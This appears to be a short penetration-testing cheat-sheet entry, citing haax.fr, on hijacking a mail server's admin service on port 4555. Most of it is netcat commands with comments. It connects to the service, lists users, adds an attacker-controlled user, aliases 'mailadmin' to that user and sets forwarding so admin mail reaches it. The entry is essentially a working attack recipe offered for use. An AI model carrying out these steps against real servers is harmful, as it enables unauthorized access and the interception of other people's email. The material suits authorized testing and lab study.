Forwarding Admin Emails 
```bash
# Connection through netcat (can test for creds)
nc -nv <IP> 4555

# Get commands
HELP

# Get users (hopefully an admin?)
listusers

# Add user
adduser $user $pass

# Set an alias for our user
setalias mailadmin $user

# Set mail forwarding
setforwarding mailadmin $user@email.local
```

## References

[haax.fr](https://cheatsheet.haax.fr/network/services-enumeration/4555_rsip/)